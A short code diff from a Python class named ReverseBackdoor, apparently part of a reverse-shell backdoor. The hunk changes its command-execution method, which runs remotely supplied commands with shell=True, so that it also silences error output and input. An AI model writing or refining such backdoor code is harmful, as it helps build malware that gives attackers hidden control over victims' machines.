@@ -70,7 +70,7 @@ class ReverseBackdoor:
 		'''
 		executes command and return command's output.
 		'''
-		return subprocess.check_output(command, shell=True).decode('utf-8')
+		return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
 
 
 	def cwd(self,path):
